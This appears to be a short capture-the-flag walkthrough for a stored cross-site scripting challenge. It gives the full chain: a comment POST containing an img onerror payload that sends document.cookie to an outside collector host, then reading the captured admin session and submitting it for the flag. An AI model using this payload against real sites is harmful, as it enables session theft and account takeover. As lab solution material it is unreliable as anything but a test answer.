Full chain:

```
POST /comment
Content-Type: application/json

{"author":"guest","body":"<img src=x onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\">"}
```

Wait a few seconds for the admin bot to moderate. Then:

```
GET /oob/received
```

Find the item with a path like `/report?c=session%3D<32 hex>`. That 32-hex value
is the admin session. Submit it:

```
POST /solve   {"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow (it also checks
that `/admin/moderate` is 403 for you — proving you never see the page you are
attacking).
